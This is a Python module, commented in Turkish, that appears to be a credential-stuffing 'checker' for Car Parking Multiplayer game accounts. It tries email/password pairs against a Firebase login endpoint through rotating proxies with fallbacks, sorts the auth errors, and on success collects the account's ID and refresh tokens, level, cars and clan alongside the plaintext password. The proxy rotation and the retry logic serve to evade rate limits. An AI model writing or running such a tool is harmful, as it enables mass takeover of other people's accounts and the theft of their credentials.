import json
import asyncio
from datetime import datetime
from typing import Optional, Tuple, Dict, Any
import aiohttp

from config import AUTH_LOGIN_URL, AUTH_LOOKUP_URL, CF_BASE_URL, APIFY_PROXY_URL
from proxy_manager import proxy_mgr

def format_ts(val):
    if not val:
        return "Bilinmiyor"
    try:
        return datetime.fromtimestamp(int(val) / 1000.0).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return str(val)

# Kesinlikle tekrar denenmeyecek kullanıcı/şifre hataları
DEFINITE_AUTH_ERRORS = [
    "INVALID_PASSWORD",
    "EMAIL_NOT_FOUND",
    "USER_DISABLED",
    "INVALID_LOGIN_CREDENTIALS"
]

async def async_http_post(
    session: aiohttp.ClientSession,
    url: str,
    payload: Optional[dict] = None,
    headers: Optional[dict] = None,
    timeout: float = 9.0,
    proxy: Optional[str] = None
) -> Tuple[Optional[Any], Optional[str]]:
    if headers is None:
        headers = {}
    if "Content-Type" not in headers:
        headers["Content-Type"] = "application/json"

    client_timeout = aiohttp.ClientTimeout(total=timeout)

    try:
        kwargs = {
            "json": payload or {},
            "headers": headers,
            "timeout": client_timeout
        }
        if proxy:
            kwargs["proxy"] = proxy

        async with session.post(url, **kwargs) as resp:
            body_text = await resp.text()
            try:
                data = json.loads(body_text)
            except Exception:
                data = body_text

            if resp.status == 200:
                return data, None
            else:
                err_msg = "Bilinmeyen Hata"
                if isinstance(data, dict) and "error" in data:
                    err_msg = data["error"].get("message", str(data["error"]))
                elif isinstance(data, str):
                    err_msg = data
                return None, err_msg
    except asyncio.TimeoutError:
        return None, "Zaman Aşımı (Timeout)"
    except Exception as e:
        return None, str(e)

async def fetch_cpm_account_details(
    session: aiohttp.ClientSession,
    email: str,
    password: str,
    id_token: str,
    uid: str,
    proxy: Optional[str] = None
) -> Dict[str, Any]:
    details = {
        "email": email,
        "password": password,
        "uid": uid,
        "idToken": id_token,
        "cpm_level": 0,
        "cpm_reports": 0,
        "cpm_can_play": 1,
        "cpm_total_cars": 0,
        "cpm_unlocked_cars": 0,
        "cpm_unlocked_ids": [],
        "cpm_custom_cars": 0,
        "cpm_custom_ids": [],
        "cpm_cars": [],
        "cpm_clan_id": None,
        "firebase_profile": {},
        "checked_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

    cf_headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {id_token}"
    }

    # 5 alt isteği paralel asenkron olarak sorgula (8 saniye toleransla)
    tasks = [
        async_http_post(session, AUTH_LOOKUP_URL, {"idToken": id_token}, timeout=8.0, proxy=proxy),
        async_http_post(session, f"{CF_BASE_URL}/GetUserConnectionData2", {"data": {}}, cf_headers, timeout=8.0, proxy=proxy),
        async_http_post(session, f"{CF_BASE_URL}/WSGetCarIDnStatusV3", {"data": {}}, cf_headers, timeout=8.0, proxy=proxy),
        async_http_post(session, f"{CF_BASE_URL}/GetAllCars2", {"data": {}}, cf_headers, timeout=8.0, proxy=proxy),
        async_http_post(session, f"{CF_BASE_URL}/GetClanId", {"data": {}}, cf_headers, timeout=8.0, proxy=proxy),
    ]

    results = await asyncio.gather(*tasks, return_exceptions=True)

    prof_res, _ = results[0] if isinstance(results[0], tuple) else (None, None)
    conn_res, _ = results[1] if isinstance(results[1], tuple) else (None, None)
    status_res, _ = results[2] if isinstance(results[2], tuple) else (None, None)
    cars_res, _ = results[3] if isinstance(results[3], tuple) else (None, None)
    clan_res, _ = results[4] if isinstance(results[4], tuple) else (None, None)

    # 1. Firebase Profil
    if prof_res and isinstance(prof_res, dict) and "users" in prof_res and len(prof_res["users"]) > 0:
        u = prof_res["users"][0]
        details["firebase_profile"] = {
            "displayName": u.get("displayName"),
            "photoUrl": u.get("photoUrl"),
            "emailVerified": u.get("emailVerified", False),
            "disabled": u.get("disabled", False),
            "createdAt": format_ts(u.get("createdAt")),
            "lastLoginAt": format_ts(u.get("lastLoginAt")),
            "passwordUpdatedAt": format_ts(u.get("passwordUpdatedAt"))
        }

    # 2. Level, Reports, CanPlay
    if conn_res and isinstance(conn_res, dict) and "result" in conn_res:
        try:
            c_data = json.loads(conn_res["result"]) if isinstance(conn_res["result"], str) else conn_res["result"]
            if isinstance(c_data, dict):
                details["cpm_level"] = c_data.get("level", 0)
                details["cpm_reports"] = c_data.get("reports", 0)
                details["cpm_can_play"] = c_data.get("canPlay", 1)
        except Exception:
            pass

    # 3. Açık Araç ID Listesi
    if status_res and isinstance(status_res, dict) and "result" in status_res:
        try:
            s_data = json.loads(status_res["result"]) if isinstance(status_res["result"], str) else status_res["result"]
            if isinstance(s_data, dict) and "carStatus" in s_data:
                car_status = s_data["carStatus"]
                unlocked_ids = [i for i, x in enumerate(car_status) if x == 1]
                details["cpm_unlocked_cars"] = len(unlocked_ids)
                details["cpm_unlocked_ids"] = unlocked_ids
        except Exception:
            pass

    # 4. Modifiyeli Garaj Araç ID Listesi
    if cars_res and isinstance(cars_res, dict) and "result" in cars_res:
        try:
            raw_cars = json.loads(cars_res["result"]) if isinstance(cars_res["result"], str) else cars_res["result"]
            if isinstance(raw_cars, list):
                custom_ids = [car.get("CarID") for car in raw_cars if isinstance(car, dict) and "CarID" in car]
                details["cpm_custom_cars"] = len(custom_ids)
                details["cpm_custom_ids"] = custom_ids
                details["cpm_cars"] = custom_ids
        except Exception:
            pass

    details["cpm_total_cars"] = max(details.get("cpm_unlocked_cars", 0), details.get("cpm_custom_cars", 0))

    # 5. Klan
    if clan_res and isinstance(clan_res, dict) and "result" in clan_res:
        details["cpm_clan_id"] = str(clan_res.get("result") or "").strip() or None

    return details

async def check_cpm_account(
    session: aiohttp.ClientSession,
    email: str,
    password: str,
    max_retries: int = 4
) -> Tuple[bool, Dict[str, Any], Optional[str]]:
    """
    Ultra Hassas Hesap Kontrol Motoru:
    1. Havuzdan farklı proxylerle 3 deneme yapar.
    2. Eğer proxyler sürekli zaman aşımına uğrarsa 4. denemede doğrudan/Apify fallback yapar.
    3. Gerçek şifre/kullanıcı hatalarında tek seferde sonlanır.
    """
    email = email.strip()
    password = password.strip()

    payload = {
        "email": email,
        "password": password,
        "returnSecureToken": True
    }

    last_err = "Bilinmeyen Hata"

    for attempt in range(max_retries):
        # Son denemede proxy düşerse doğrudan veya Apify ile kurtar
        if attempt == max_retries - 1 and APIFY_PROXY_URL:
            current_proxy = APIFY_PROXY_URL
        elif attempt == max_retries - 1:
            current_proxy = None # Doğrudan son şans denemesi
        else:
            current_proxy = proxy_mgr.get_proxy()

        res, err = await async_http_post(
            session=session,
            url=AUTH_LOGIN_URL,
            payload=payload,
            timeout=8.5,
            proxy=current_proxy
        )

        if res and isinstance(res, dict) and "idToken" in res:
            uid = res.get("localId", "")
            id_token = res["idToken"]
            details = await fetch_cpm_account_details(session, email, password, id_token, uid, proxy=current_proxy)
            details["refreshToken"] = res.get("refreshToken")
            return True, details, None

        last_err = err or "Giriş Başarısız"

        # Eğer hata kesin bir kullanıcı/şifre hatasıysa hemen çık (şifre yanlış veya hesap yok)
        is_definite_auth_fail = any(auth_err in last_err for auth_err in DEFINITE_AUTH_ERRORS)
        if is_definite_auth_fail:
            break

        # Ağ/Proxy hatasında kısa bekle ve tekrar dene
        if attempt < max_retries - 1:
            await asyncio.sleep(0.2)

    # Hata mesajını sadeleştir
    err_msg = last_err
    if "INVALID_PASSWORD" in err_msg or "INVALID_LOGIN_CREDENTIALS" in err_msg:
        err_msg = "Hatalı Şifre"
    elif "EMAIL_NOT_FOUND" in err_msg:
        err_msg = "Hesap Bulunamadı"
    elif "USER_DISABLED" in err_msg:
        err_msg = "Hesap Devre Dışı"
    elif "TOO_MANY_ATTEMPTS" in err_msg:
        err_msg = "Rate Limit (Lütfen Bekleyin veya Proxy Ekleyin)"

    return False, {"email": email, "password": password}, err_msg
